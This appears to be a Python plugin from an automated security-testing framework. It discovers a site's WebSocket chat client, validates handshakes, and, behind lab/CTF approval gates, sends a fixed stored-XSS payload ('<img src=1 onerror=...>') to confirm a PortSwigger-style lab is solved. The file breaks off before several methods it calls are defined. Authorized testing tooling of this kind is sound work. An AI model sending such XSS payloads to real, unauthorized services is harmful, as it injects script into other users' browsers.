"""Closed root-URL-only WebSocket message-XSS calibration probe (#1294).

The model controls only the workflow root.  This tool discovers an observed
same-origin WebSocket client, validates RFC 6455 handshakes against one pinned
destination, and keeps application frames behind explicit lab/CTF gates.  The
first mode deliberately proves only the PortSwigger-style stored/blind XSS
message path; handshake bypass and cross-site WebSocket hijacking need separate
contracts.
"""

from __future__ import annotations

import asyncio
import base64
import hashlib
import html
import json
import re
import secrets
import socket
import ssl
import struct
from html.parser import HTMLParser
from typing import Any, Dict, List, NamedTuple, Optional, Set, Tuple
from urllib.parse import urljoin, urlsplit

from plugin_interface import ToolPlugin
from tools.web_request_smuggling_probe import read_http_response


MODE = "websocket-message-xss-v1"
RUNTIME_PROOF = "runtime-observation"
LAB_PROOF = "lab-state-change"
USER_AGENT = "xASM-WebSocket-Probe/1.0"
XSS_PAYLOAD = "<img src=1 onerror='alert(1)'>"
CANONICAL_MESSAGE = json.dumps({"message": XSS_PAYLOAD}, separators=(",", ":"))
MAX_TARGET_CHARS = 4_096
MAX_DISCOVERY_PAGES = 5
MAX_REQUEST_BUDGET = 24
MAX_RESPONSE_BYTES = 250_000
MAX_EVIDENCE_CHARS = 96_000
MAX_FRAME_BYTES = 4_096
MAX_HEADER_BYTES = 32_768
MAX_SERVER_FRAMES = 8
MAX_LAB_POLLS = 8
WEBSOCKET_GUID = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"

RUNTIME_LABELS = (
    "websocket-root-baseline",
    "websocket-client-discovery-control",
    "websocket-upgrade-negative-control",
    "websocket-handshake-control",
)
LAB_LABELS = (
    "websocket-message-xss-proof",
    "lab-solved-confirmation",
)

SENSITIVE_HEADER_RE = re.compile(
    r"(?im)^(authorization|cookie|set-cookie|proxy-authorization|x-api-key|"
    r"x-csrf-token|x-xsrf-token)\s*:\s*([^\r\n]*)(?=\r?$)"
)
EMAIL_RE = re.compile(r"(?i)\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,}\b")
TOKEN_RE = re.compile(
    r"\b(?:eyJ[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}|"
    r"[A-Za-z0-9_+/.=-]{48,})\b"
)
ABSOLUTE_WS_RE = re.compile(r"(?i)\bwss?://[^\s'\"<>`\\]+")
CHAT_PATH_RE = re.compile(r"(?i)(?:^|/)(?:chat|live-?chat|support|messages?)(?:/|$)")


class _PinnedOrigin(NamedTuple):
    scheme: str
    hostname: str
    port: int
    family: int
    ip: str

    @property
    def origin(self) -> str:
        default = 443 if self.scheme == "https" else 80
        formatted = f"[{self.hostname}]" if ":" in self.hostname else self.hostname
        return f"{self.scheme}://{formatted}{'' if self.port == default else f':{self.port}'}"


class _DiscoveryParser(HTMLParser):
    def __init__(self) -> None:
        super().__init__(convert_charrefs=True)
        self.hrefs: List[str] = []
        self.script_srcs: List[str] = []
        self.inline_scripts: List[str] = []
        self._script: Optional[List[str]] = None

    def handle_starttag(
        self, tag: str, attrs: List[Tuple[str, Optional[str]]]
    ) -> None:
        values = {str(name).lower(): str(value or "") for name, value in attrs}
        lower = tag.lower()
        if lower == "a" and values.get("href"):
            self.hrefs.append(values["href"].strip())
        if lower == "script":
            if values.get("src"):
                self.script_srcs.append(values["src"].strip())
            else:
                self._script = []

    def handle_data(self, data: str) -> None:
        if self._script is not None:
            self._script.append(data)

    def handle_endtag(self, tag: str) -> None:
        if tag.lower() == "script" and self._script is not None:
            self.inline_scripts.append("".join(self._script))
            self._script = None


def _sha(value: str) -> str:
    return hashlib.sha256(value.encode("utf-8", "replace")).hexdigest()


def _sha_bytes(value: bytes) -> str:
    return hashlib.sha256(value).hexdigest()


def _marker(value: str) -> str:
    return f"[REDACTED sha256={_sha(value)} len={len(value)}]"


def _bounded_int(value: Any, default: int, low: int, high: int) -> int:
    try:
        return max(low, min(int(value), high))
    except (TypeError, ValueError):
        return default


def _origin_tuple(value: str) -> Tuple[str, str, int]:
    parsed = urlsplit(value)
    scheme = parsed.scheme.lower()
    if scheme in {"ws", "http"}:
        normalized_scheme = "http"
        default = 80
    elif scheme in {"wss", "https"}:
        normalized_scheme = "https"
        default = 443
    else:
        normalized_scheme = scheme
        default = 0
    return normalized_scheme, (parsed.hostname or "").lower(), parsed.port or default


def _origin_value(value: str) -> str:
    parsed = urlsplit(value)
    scheme = parsed.scheme.lower()
    host = (parsed.hostname or "").lower()
    port = parsed.port or (443 if scheme == "https" else 80)
    default = 443 if scheme == "https" else 80
    formatted = f"[{host}]" if ":" in host else host
    return f"{scheme}://{formatted}{'' if port == default else f':{port}'}"


def _same_origin(left: str, right: str) -> bool:
    return _origin_tuple(left) == _origin_tuple(right)


def _validate_target(value: Any) -> Optional[str]:
    raw = str(value or "").strip()
    if not raw or len(raw) > MAX_TARGET_CHARS or any(ch in raw for ch in "\r\n\0"):
        return None
    try:
        parsed = urlsplit(raw)
        _ = parsed.port
    except ValueError:
        return None
    if (
        parsed.scheme.lower() not in {"http", "https"}
        or not parsed.hostname
        or parsed.username
        or parsed.password
        or parsed.query
        or parsed.fragment
        or parsed.path not in {"", "/"}
    ):
        return None
    return f"{_origin_value(raw)}/"


def _safe_same_origin_url(base: str, candidate: str) -> Optional[str]:
    raw = html.unescape(str(candidate or "")).strip()
    if (
        not raw
        or len(raw) > 2_048
        or any(ch in raw for ch in "\r\n\0\\")
        or raw.startswith(("javascript:", "data:", "mailto:", "tel:", "//"))
    ):
        return None
    absolute = urljoin(base, raw)
    try:
        parsed = urlsplit(absolute)
    except ValueError:
        return None
    if (
        parsed.scheme not in {"http", "https"}
        or not _same_origin(base, absolute)
        or parsed.username
        or parsed.password
        or parsed.fragment
    ):
        return None
    return absolute


def _safe_websocket_url(target: str, candidate: str) -> Optional[str]:
    raw = html.unescape(str(candidate or "")).strip().rstrip("),;")
    raw = raw.replace("\\/", "/")
    if not raw or len(raw) > 2_048 or any(ch in raw for ch in "\r\n\0\\"):
        return None
    target_parts = urlsplit(target)
    if raw.startswith("/") and not raw.startswith("//"):
        scheme = "wss" if target_parts.scheme == "https" else "ws"
        raw = f"{scheme}://{target_parts.netloc}{raw}"
    try:
        parsed = urlsplit(raw)
        _ = parsed.port
    except ValueError:
        return None
    if (
        parsed.scheme.lower() not in {"ws", "wss"}
        or not parsed.hostname
        or parsed.username
        or parsed.password
        or parsed.fragment
        or not parsed.path.startswith("/")
        or not _same_origin(target, raw)
    ):
        return None
    return raw


def _is_unsolved(body: str) -> bool:
    lower = str(body or "").lower()
    return "is-notsolved" in lower and "is-solved" not in lower


def _is_solved(body: str) -> bool:
    lower = str(body or "").lower()
    return "is-solved" in lower and "is-notsolved" not in lower


def _websocket_accept(key: str) -> str:
    digest = hashlib.sha1((key + WEBSOCKET_GUID).encode("ascii")).digest()
    return base64.b64encode(digest).decode("ascii")


def _encode_client_frame(opcode: int, payload: bytes, mask: Optional[bytes] = None) -> bytes:
    if not 0 <= opcode <= 0xF or len(payload) > MAX_FRAME_BYTES:
        raise ValueError("WebSocket frame is outside the bounded contract")
    mask_key = bytes(mask or secrets.token_bytes(4))
    if len(mask_key) != 4:
        raise ValueError("WebSocket client mask must be four bytes")
    first = 0x80 | opcode
    length = len(payload)
    if length < 126:
        header = bytes((first, 0x80 | length))
    elif length <= 0xFFFF:
        header = bytes((first, 0x80 | 126)) + struct.pack("!H", length)
    else:
        header = bytes((first, 0x80 | 127)) + struct.pack("!Q", length)
    masked = bytes(byte ^ mask_key[index % 4] for index, byte in enumerate(payload))
    return header + mask_key + masked


def decode_client_text_frame(frame: bytes) -> str:
    """Strict decoder exported for unit/backend fixture parity."""
    if len(frame) < 6 or frame[0] != 0x81 or not frame[1] & 0x80:
        raise ValueError("expected one masked FIN text frame")
    marker = frame[1] & 0x7F
    cursor = 2
    if marker == 126:
        if len(frame) < 8:
            raise ValueError("truncated extended WebSocket frame")
        length = struct.unpack("!H", frame[cursor : cursor + 2])[0]
        cursor += 2
    elif marker == 127:
        if len(frame) < 14:
            raise ValueError("truncated extended WebSocket frame")
        length = struct.unpack("!Q", frame[cursor : cursor + 8])[0]
        cursor += 8
    else:
        length = marker
    if length > MAX_FRAME_BYTES or len(frame) != cursor + 4 + length:
        raise ValueError("invalid bounded WebSocket frame length")
    mask = frame[cursor : cursor + 4]
    cursor += 4
    payload = bytes(
        byte ^ mask[index % 4] for index, byte in enumerate(frame[cursor:])
    )
    return payload.decode("utf-8", "strict")


class WebWebSocketProbeTool(ToolPlugin):
    @property
    def name(self) -> str:
        return "web:websocket_probe"

    @property
    def description(self) -> str:
        return (
            "Discovers an observed same-origin WebSocket client from a root URL, "
            "validates its RFC 6455 handshake without application frames, and only "
            "under lab/CTF gates proves the fixed message-XSS vector."
        )

    @property
    def schema(self) -> Dict[str, Any]:
        owned = {"x-workflow-owned": True}
        hidden = {"x-hidden": True, "x-workflow-owned": True}
        return {
            "type": "object",
            "additionalProperties": False,
            "required": ["target"],
            "properties": {
                "target": {"type": "string", "format": "uri"},
                "mode": {"type": "string", "enum": [MODE], "default": MODE, **owned},
                "proofLevel": {
                    "type": "string",
                    "enum": [RUNTIME_PROOF, LAB_PROOF],
                    "default": RUNTIME_PROOF,
                    **owned,
                },
                "engagement": {
                    "type": "string",
                    "enum": ["standard", "aggressive", "lab", "ctf"],
                    "default": "standard",
                    **owned,
                },
                "discoverFromTarget": {"type": "boolean", "default": True, **owned},
                "discoveryPageBudget": {
                    "type": "integer",
                    "minimum": 1,
                    "maximum": MAX_DISCOVERY_PAGES,
                    "default": 4,
                    **owned,
                },
                "requestBudget": {
                    "type": "integer",
                    "minimum": 4,
                    "maximum": MAX_REQUEST_BUDGET,
                    "default": 16,
                    **owned,
                },
                "handshakeBudget": {
                    "type": "integer",
                    "minimum": 1,
                    "maximum": 3,
                    "default": 3,
                    **owned,
                },
                "clientTextFrameBudget": {
                    "type": "integer",
                    "minimum": 0,
                    "maximum": 1,
                    "default": 0,
                    **owned,
                },
                "maxResponseBytes": {
                    "type": "integer",
                    "minimum": 4_096,
                    "maximum": MAX_RESPONSE_BYTES,
                    "default": 96_000,
                    **owned,
                },
                "maxFrameBytes": {
                    "type": "integer",
                    "minimum": 256,
                    "maximum": MAX_FRAME_BYTES,
                    "default": 4_096,
                    **owned,
                },
                "labPollBudget": {
                    "type": "integer",
                    "minimum": 1,
                    "maximum": MAX_LAB_POLLS,
                    "default": 8,
                    **owned,
                },
                "stopAfterFirstFinding": {"type": "boolean", "default": True, **owned},
                "allowActiveWebSocketFrames": {
                    "type": "boolean", "default": False, **owned
                },
                "stateChangeApproved": {"type": "boolean", "default": False, **owned},
                "labVictimInteractionApproved": {
                    "type": "boolean", "default": False, **owned
                },
                "authCookies": {"type": "string", **hidden},
                "authHeaders": {
                    "type": "object",
                    "additionalProperties": {"type": "string"},
                    **hidden,
                },
            },
        }

    @property
    def metadata(self) -> Dict[str, Any]:
        return {
            "category": "exploit-test",
            "phase": 3,
            "domain": ["web", "api"],
            "input_type": ["url", "authenticated-session"],
            "output_type": ["findings"],
            "chainable_after": ["browser:map_app", "browser:traffic_capture", "katana:"],
            "chainable_before": ["decision:"],
            "taxonomy_domain": ["web", "api"],
            "lifecycle_phase": "exploit-test",
            "purpose_count": "single",
            "primary_purpose": "Prove stored XSS delivered through a WebSocket text message",
        }

    async def execute(self, parameters: Dict[str, Any]) -> Dict[str, Any]:
        target = _validate_target(parameters.get("target"))
        if not target:
            return self._error("target must be a credential-free HTTP(S) root URL")
        if str(parameters.get("mode") or MODE) != MODE:
            return self._error(f"mode must be {MODE}", target)
        proof_level = str(parameters.get("proofLevel") or RUNTIME_PROOF)
        engagement = str(parameters.get("engagement") or "standard").lower()
        if proof_level not in {RUNTIME_PROOF, LAB_PROOF}:
            return self._error("unsupported proofLevel", target)
        if engagement not in {"standard", "aggressive", "lab", "ctf"}:
            return self._error("unsupported engagement", target)
        if parameters.get("discoverFromTarget", True) is not True:
            return self._error("discoverFromTarget must remain enabled", target)
        if parameters.get("stopAfterFirstFinding", True) is not True:
            return self._error("stopAfterFirstFinding must remain enabled", target)
        if proof_level == LAB_PROOF and not all(
            (
                engagement in {"lab", "ctf"},
                parameters.get("allowActiveWebSocketFrames") is True,
                parameters.get("stateChangeApproved") is True,
                parameters.get("labVictimInteractionApproved") is True,
            )
        ):
            return self._error(
                "lab-state-change requires lab/ctf and every server-owned WebSocket gate",
                target,
            )
        expected_frame_budget = 1 if proof_level == LAB_PROOF else 0
        raw_frame_budget = parameters.get("clientTextFrameBudget", expected_frame_budget)
        try:
            frame_budget = int(raw_frame_budget)
        except (TypeError, ValueError):
            frame_budget = -1
        if frame_budget != expected_frame_budget:
            return self._error(
                "clientTextFrameBudget must match the server-owned proof tier", target
            )

        auth_headers, cookie, auth_error = self._auth_context(parameters)
        if auth_error:
            return self._error(auth_error, target)
        self._target = target
        self._auth_headers = auth_headers
        self._cookies: Dict[str, str] = self._parse_cookie_header(cookie or "")
        self._workflow_cookie = cookie
        self._bootstrap_cookie_header: Optional[str] = None
        self._secrets: Set[str] = set(auth_headers.values())
        if cookie:
            self._secrets.add(cookie)
            self._secrets.update(self._cookies.values())
        auth_material = []
        if cookie:
            auth_material.append(f"cookie:{cookie}")
        auth_material.extend(
            f"{name.lower()}:{value}" for name, value in sorted(auth_headers.items())
        )
        self._workflow_auth_context_sha = _sha(
            "\n".join(auth_material) or f"anonymous:{_origin_value(target)}/"
        )
        self._auth_context_sha = self._workflow_auth_context_sha
        self._session_source = (
            "workflow-auth-context" if auth_material else "anonymous"
        )
        self._requests = 0
        self._application_frames = 0
        self._state_changing_frames = 0
        self._control_frames = 0
        self._handshakes = 0
        self._budget = _bounded_int(
            parameters.get("requestBudget"), 16, 4, MAX_REQUEST_BUDGET
        )
        self._page_budget = _bounded_int(
            parameters.get("discoveryPageBudget"), 4, 1, MAX_DISCOVERY_PAGES
        )
        self._handshake_budget = _bounded_int(
            parameters.get("handshakeBudget"), 3, 1, 3
        )
        self._max_body = _bounded_int(
            parameters.get("maxResponseBytes"), 96_000, 4_096, MAX_RESPONSE_BYTES
        )
        self._max_frame = _bounded_int(
            parameters.get("maxFrameBytes"), 4_096, 256, MAX_FRAME_BYTES
        )
        self._poll_budget = _bounded_int(
            parameters.get("labPollBudget"), 8, 1, MAX_LAB_POLLS
        )
        self._timeout = 20

        try:
            self._pin = await self._resolve_once(target)
            root = await self._http_get(target)
            self._refresh_session_context()
            root_step = self._http_evidence(RUNTIME_LABELS[0], root)
            if root["status"] != 200 or 300 <= root["status"] <= 399:
                return self._result(target, proof_level, "root did not return HTTP 200", [root_step])

            discovery = await self._discover_client(root)
            if not discovery:
                return self._result(
                    target, proof_level, "no observed same-origin WebSocket client", [root_step]
                )
            client_page_url, client_page, source, websocket_url = discovery
            discovery_step = self._client_discovery_evidence(client_page, source)

            negative_url = self._negative_websocket_url(websocket_url)
            negative = await self._websocket_handshake(negative_url)
            negative_step = self._websocket_evidence(
                RUNTIME_LABELS[2], negative, server_text=""
            )
            if negative["status"] == 101:
                await self._close_writer(negative.get("writer"), send_close=True)
                return self._result(
                    target,
                    proof_level,
                    "random WebSocket upgrade path was accepted",
                    [root_step, discovery_step, negative_step],
                    client_page_url=client_page_url,
                    discovery_source_url=source["url"],
                    websocket_url=websocket_url,
                )
            await self._close_writer(negative.get("writer"), send_close=False)

            control = await self._websocket_handshake(websocket_url)
            control_step = self._websocket_evidence(
                RUNTIME_LABELS[3], control, server_text=""
            )
            if not control["valid"]:
                await self._close_writer(control.get("writer"), send_close=False)
                return self._result(
                    target,
                    proof_level,
                    "observed WebSocket handshake failed strict RFC 6455 validation",
                    [root_step, discovery_step, negative_step, control_step],
                    client_page_url=client_page_url,
                    discovery_source_url=source["url"],
                    websocket_url=websocket_url,
                )
            await self._close_writer(control.get("writer"), send_close=True)
            runtime_steps = [root_step, discovery_step, negative_step, control_step]

            if proof_level == RUNTIME_PROOF:
                return self._result(
                    target,
                    proof_level,
                    "observed WebSocket handshake validated; active frames were not authorized",
                    runtime_steps,
                    client_page_url=client_page_url,
                    discovery_source_url=source["url"],
                    websocket_url=websocket_url,
                    handshake_validated=True,
                    negative_rejected=True,
                )
            if not _is_unsolved(root["body"]):
                return self._result(
                    target,
                    proof_level,
                    "lab root was not in a fresh Not solved state",
                    runtime_steps,
                    client_page_url=client_page_url,
                    discovery_source_url=source["url"],
                    websocket_url=websocket_url,
                    handshake_validated=True,
                    negative_rejected=True,
                )

            proof = await self._send_message_proof(websocket_url)
            proof_step = self._websocket_evidence(
                LAB_LABELS[0],
                proof,
                client_frame=proof["clientFrame"],
                client_text=CANONICAL_MESSAGE,
                server_text=proof["serverText"],
                server_frame=proof.get("serverFrame"),
            )
            if not proof["valid"] or XSS_PAYLOAD not in proof["serverText"]:
                return self._result(
                    target,
                    proof_level,
                    "fixed WebSocket message was not echoed raw",
                    [*runtime_steps, proof_step],
                    client_page_url=client_page_url,
                    discovery_source_url=source["url"],
                    websocket_url=websocket_url,
                    handshake_validated=True,
                    negative_rejected=True,
                )

            solved: Optional[Dict[str, Any]] = None
            for attempt in range(self._poll_budget):
                candidate = await self._http_get(target)
                if _is_solved(candidate["body"]):
                    solved = candidate
                    break
                if attempt + 1 < self._poll_budget:
                    await asyncio.sleep(0.5)
            if solved is None:
                return self._result(
                    target,
                    proof_level,
                    "bounded lab polling did not observe Solved",
                    [*runtime_steps, proof_step],
                    client_page_url=client_page_url,
                    discovery_source_url=source["url"],
                    websocket_url=websocket_url,
                    handshake_validated=True,
                    negative_rejected=True,
                )

            solved_step = self._http_evidence(LAB_LABELS[1], solved)
            steps = [*runtime_steps, proof_step, solved_step]
            verification = self._verification(
                proof_level,
                steps,
                client_page_url=client_page_url,
                discovery_source_url=source["url"],
                websocket_url=websocket_url,
                verified=True,
                handshake_validated=True,
                negative_rejected=True,
                echo_matched=True,
                solved_transition=True,
                client_frame=proof["clientFrame"],
            )
            finding = self._finding(client_page_url, proof_step, verification)
            return {
                "success": True,
                "tool": self.name,
                "target": target,
                "mode": MODE,
                "proofLevel": proof_level,
                "sessionSource": self._session_source,
                "verified": True,
                "fallback": False,
                "requestCount": self._requests,
                "findings": [finding],
                "total_findings": 1,
                "verification": verification,
                "summary": {
                    "requests": self._requests,
                    "applicationFrames": self._application_frames,
                    "findings": 1,
                    "fallback": False,
                },
            }
        except (asyncio.TimeoutError, ConnectionError, OSError, ssl.SSLError, ValueError) as exc:
            return self._result(target, proof_level, str(exc), [])

    async def _resolve_once(self, target: str) -> _PinnedOrigin:
        parsed = urlsplit(target)
        host = str(parsed.hostname or "")
        port = parsed.port or (443 if parsed.scheme == "https" else 80)
        addresses = await asyncio.wait_for(
            asyncio.get_running_loop().getaddrinfo(host, port, type=socket.SOCK_STREAM),
            timeout=20,
        )
        if not addresses:
            raise OSError("target DNS resolution returned no addresses")
        family, _type, _proto, _canon, sockaddr = addresses[0]
        return _PinnedOrigin(parsed.scheme, host, port, family, str(sockaddr[0]))

    def _auth_context(
        self, parameters: Dict[str, Any]
    ) -> Tuple[Dict[str, str], Optional[str], Optional[str]]:
        cookie: Optional[str] = None
        raw_cookie = parameters.get("authCookies")
        if raw_cookie is not None:
            if (
                not isinstance(raw_cookie, str)
                or not raw_cookie.strip()
                or len(raw_cookie) > 8_192
                or any(ch in raw_cookie for ch in "\r\n\0")
                or "=" not in raw_cookie
            ):
                return {}, None, "invalid server-owned cookie context"
            cookie = raw_cookie.strip()
        headers: Dict[str, str] = {}
        raw_headers = parameters.get("authHeaders") or {}
        if not isinstance(raw_headers, dict):
            return {}, None, "invalid server-owned auth header context"
        for name, value in raw_headers.items():
            lower = str(name).strip().lower()
            if lower not in {"authorization", "x-api-key"}:
                return {}, None, "only Authorization and X-Api-Key auth headers are supported"
            if (
                not isinstance(value, str)
                or not value
                or len(value) > 8_192
                or any(ch in value for ch in "\r\n\0")
            ):
                return {}, None, "invalid server-owned auth header value"
            canonical = "Authorization" if lower == "authorization" else "X-Api-Key"
            headers[canonical] = value
        return headers, cookie, None

    def _parse_cookie_header(self, value: str) -> Dict[str, str]:
        cookies: Dict[str, str] = {}
        for part in str(value or "").split(";"):
            if "=" not in part:
                continue
            name, cookie_value = part.split("=", 1)
            name = name.strip()
            cookie_value = cookie_value.strip()
            if name and cookie_value and re.fullmatch(r"[!#$%&'*+.^_`|~0-9A-Za-z-]+", name):
                cookies[name] = cookie_value
        return cookies

    def _capture_response_cookies(self, response: Dict[str, Any]) -> None:
        for name, value in response.get("headers", []):
            if str(name).lower() != "set-cookie":
                continue
            first = str(value).split(";", 1)[0]
            parsed = self._parse_cookie_header(first)
            for cookie_name, cookie_value in parsed.items():
                self._cookies[cookie_name] = cookie_value
                self._secrets.add(cookie_value)
            if (
                self._workflow_cookie is None
                and self._bootstrap_cookie_header is None
                and parsed
            ):
                self._bootstrap_cookie_header = "; ".join(
                    f"{name}={cookie_value}"
                    for name, cookie_value in sorted(parsed.items())
                )
            self._secrets.add(str(value))

    def _refresh_session_context(self) -> None:
        if self._workflow_cookie is not None or self._auth_headers:
            self._session_source = "workflow-auth-context"
            self._auth_context_sha = self._workflow_auth_context_sha
            return
        if self._bootstrap_cookie_header:
            self._session_source = "target-bootstrap-cookie"
            # This is intentionally the SAME digest rendered inside the
            # Set-Cookie/Cookie evidence marker, so the strict backend can
            # verify bootstrap-session continuity without retaining the raw
            # target-issued cookie.
            self._auth_context_sha = _sha(self._bootstrap_cookie_header)
            return
        self._session_source = "anonymous"
        self._auth_context_sha = _sha(f"anonymous:{_origin_value(self._target)}/")

    def _cookie_header(self) -> str:
        return "; ".join(f"{name}={value}" for name, value in sorted(self._cookies.items()))

    async def _open_stream(self) -> Tuple[asyncio.StreamReader, asyncio.StreamWriter]:
        ssl_context = ssl.create_default_context() if self._pin.scheme == "https" else None
        return await asyncio.wait_for(
            asyncio.open_connection(
                host=self._pin.ip,
                port=self._pin.port,
                family=self._pin.family,
                ssl=ssl_context,
                server_hostname=self._pin.hostname if ssl_context else None,
            ),
            timeout=self._timeout,
        )

    def _host_header(self) -> str:
        default = 443 if self._pin.scheme == "https" else 80
        return self._pin.hostname if self._pin.port == default else f"{self._pin.hostname}:{self._pin.port}"

    async def _http_get(self, url: str) -> Dict[str, Any]:
        if self._requests >= self._budget:
            raise ValueError("request budget exhausted")
        if not _same_origin(url, self._target):
            raise ValueError("HTTP request left the authorized origin")
        parsed = urlsplit(url)
        path = parsed.path or "/"
        if parsed.query:
            path += "?" + parsed.query
        lines = [
            f"GET {path} HTTP/1.1",
            f"Host: {self._host_header()}",
            f"User-Agent: {USER_AGENT}",
            "Accept: text/html, application/javascript;q=0.9",
            "Accept-Encoding: identity",
            "Cache-Control: no-store",
            "Connection: close",
        ]
        lines.extend(f"{name}: {value}" for name, value in self._auth_headers.items())
        cookie = self._cookie_header()
        if cookie:
            lines.append(f"Cookie: {cookie}")
        raw = ("\r\n".join(lines) + "\r\n\r\n").encode("utf-8")
        reader, writer = await self._open_stream()
        self._requests += 1
        try:
            writer.write(raw)
            await writer.drain()
            response = await read_http_response(reader, self._timeout)
        finally:
            writer.close()
            try:
                await writer.wait_closed()
            except (ConnectionError, ssl.SSLError):
                pass
        body_bytes = bytes(response.get("bodyBytes") or b"")
        if len(body_bytes) > self._max_body:
            raise ValueError("HTTP response exceeded bounded body limit")
        response.update({"url": url, "rawRequest": raw.decode("utf-8", "replace")})
        self._capture_response_cookies(response)
        return response

    async def _discover_client(
        self, root: Dict[str, Any]
    ) -> Optional[Tuple[str, Dict[str, Any], Dict[str, Any], str]]:
        parser = _DiscoveryParser()
        try:
            parser.feed(str(root.get("body") or "")[: self._max_body])
        except Exception:
            return None
        root_websocket_url = self._extract_websocket_url(root.get("body") or "")
        if root_websocket_url:
            return self._target, root, root, root_websocket_url
        candidates: List[str] = []
        for raw in parser.hrefs[:200]:
            absolute = _safe_same_origin_url(self._target, raw)
            if absolute and CHAT_PATH_RE.search(urlsplit(absolute).path):
                candidates.append(absolute)
        seen: Set[str] = set()
        for client_page_url in candidates[: self._page_budget]:
            if client_page_url in seen:
                continue
            seen.add(client_page_url)
            page = await self._http_get(client_page_url)
            if page["status"] != 200 or 300 <= page["status"] <= 399:
                continue
            websocket_url = self._extract_websocket_url(page["body"])
            if websocket_url:
                return client_page_url, page, page, websocket_url
            page_parser = _DiscoveryParser()
            try:
                page_parser.feed(str(page.get("body") or "")[: self._max_body])
            except Exception:
                continue
            for raw_script in page_parser.script_srcs[: self._page_budget]:
                script_url = _safe_same_origin_url(client_page_url, raw_script)
                if not script_url or script_url in seen:
                    continue
                seen.add(script_url)
                script = await self._http_get(script_url)
                if script["status"] != 200 or 300 <= script["status"] <= 399:
                    continue
                websocket_url = self._extract_websocket_url(script["body"])
                if websocket_url:
                    return client_page_url, page, script, websocket_url
        return None

    def _extract_websocket_url(self, source: str) -> Optional[str]:
        text = html.unescape(str(source or ""))[: self._max_body]
        # Endpoint discovery alone is insufficient for this mode: the observed
        # client must also prove the message envelope that the closed tool will
        # use.  Do not guess that every chat socket accepts {message: ...}.
        message_shape_observed = bool(
            re.search(
                r"(?is)JSON\s*\.\s*stringify\s*\(\s*\{\s*"
                r"(?:['\"]message['\"]|message)\s*:",
                text,
            )
            or re.search(
                r"(?is)\.send\s*\(\s*['\"]\{\\?['\"]message\\?['\"]\s*:",
                text,
            )
        )
        if not message_shape_observed:
            return None
        raw_candidates: List[str] = [match.group(0) for match in ABSOLUTE_WS_RE.finditer(text)]
        for match in re.finditer(r"(?is)new\s+WebSocket\s*\((.{0,600}?)\)", text):
            expression = match.group(1)
            if re.search(r"(?i)(?:window\.)?location\.host", expression):
                raw_candidates.extend(
                    value
                    for _quote, value in re.findall(r"(['\"])(/[^'\"]+)\1", expression)
                )
        # A regex that stops at the first closing parenthesis cannot retain
        # location.host from the common protocol ternary below.  Match that
        # complete, static constructor shape directly; its only variable is
        # the current origin and the endpoint remains an observed literal.
        for match in re.finditer(
            r"(?is)(?:\(\s*)?(?:window\.)?location\.protocol\s*={2,3}\s*"
            r"(['\"])https:\1\s*\?\s*(['\"])wss://\2\s*:\s*"
            r"(['\"])ws://\3\s*\)?\s*\+\s*"
            r"(?:window\.)?location\.host\s*\+\s*(['\"])(/[^'\"]+)\4",
            text,
        ):
            raw_candidates.append(match.group(5))
        for match in re.finditer(
            r"(?is)wss?\s*:\s*/\s*/\s*['\"]?\s*\+\s*"
            r"(?:window\.)?location\.host\s*\+\s*(['\"])(/[^'\"]+)\1",
            text,
        ):
            raw_candidates.append(match.group(2))
        for raw in raw_candidates:
            candidate = _safe_websocket_url(self._target, raw)
            if candidate:
                return candidate
        return None

    def _negative_websocket_url(self, websocket_url: str) -> str:
        parsed = urlsplit(websocket_url)
        return f"{parsed.scheme}://{parsed.netloc}/.xasm-websocket-negative-{secrets.token_hex(12)}"

    async def _read_header_block(
        self, reader: asyncio.StreamReader
    ) -> Tuple[str, int, List[Tuple[str, str]], Dict[str, str]]:
        try:
            raw = await asyncio.wait_for(reader.readuntil(b"\r\n\r\n"), self._timeout)
        except asyncio.LimitOverrunError as exc:
            raise ValueError("WebSocket response headers exceeded bounded limit") from exc
        except asyncio.IncompleteReadError as exc:
            raise ValueError("connection closed before WebSocket response headers") from exc
        if len(raw) > MAX_HEADER_BYTES:
            raise ValueError("WebSocket response headers exceeded bounded limit")
        text = raw.decode("iso-8859-1", "replace")[:-4]
        lines = text.split("\r\n")
        match = re.fullmatch(r"HTTP/(?:1\.0|1\.1)\s+(\d{3})(?:\s+.*)?", lines[0])
        if not match:
            raise ValueError("invalid WebSocket HTTP status line")
        headers: List[Tuple[str, str]] = []
        header_map: Dict[str, str] = {}
        for line in lines[1:]:
            if ":" not in line:
                raise ValueError("invalid WebSocket response header")
            name, value = line.split(":", 1)
            lower = name.strip().lower()
            if lower in header_map:
                header_map[lower] += "," + value.strip()
            else:
                header_map[lower] = value.strip()
            headers.append((name.strip(), value.strip()))
        return text, int(match.group(1)), headers, header_map

    async def _websocket_handshake(self, websocket_url: str) -> Dict[str, Any]:
        if self._requests >= self._budget:
            raise ValueError("request budget exhausted")
        if self._handshakes >= self._handshake_budget:
            raise ValueError("WebSocket handshake budget exhausted")
        if not _same_origin(websocket_url, self._target):
            raise ValueError("WebSocket handshake left the authorized origin")
        parsed = urlsplit(websocket_url)
        path = parsed.path or "/"
        if parsed.query:
            path += "?" + parsed.query
        key = base64.b64encode(secrets.token_bytes(16)).decode("ascii")
        lines = [
            f"GET {path} HTTP/1.1",
            f"Host: {self._host_header()}",
            f"User-Agent: {USER_AGENT}",
            "Upgrade: websocket",
            "Connection: Upgrade",
            f"Origin: {_origin_value(self._target)}",
            f"Sec-WebSocket-Key: {key}",
            "Sec-WebSocket-Version: 13",
            "Cache-Control: no-store",
        ]
        lines.extend(f"{name}: {value}" for name, value in self._auth_headers.items())
        cookie = self._cookie_header()
        if cookie:
            lines.append(f"Cookie: {cookie}")
        raw = ("\r\n".join(lines) + "\r\n\r\n").encode("utf-8")
        reader, writer = await self._open_stream()
        self._requests += 1
        self._handshakes += 1
        writer.write(raw)
        await writer.drain()
        header_text, status, headers, header_map = await self._read_header_block(reader)
        response = {"headers": headers}
        self._capture_response_cookies(response)
        valid = (
            status == 101
            and header_map.get("upgrade", "").lower() == "websocket"
            and "upgrade" in {
                token.strip().lower()
                for token in header_map.get("connection", "").split(",")
            }
            and header_map.get("sec-websocket-accept") == _websocket_accept(key)
            and "sec-websocket-extensions" not in header_map
        )
        return {
            "websocketUrl": websocket_url,
            "rawRequest": raw.decode("utf-8", "replace"),
            "headerText": header_text,
            "status": status,
            "headers": headers,
            "headerMap": header_map,
            "key": key,
            "valid": valid,
            "reader": reader,
            "writer": writer,
        }

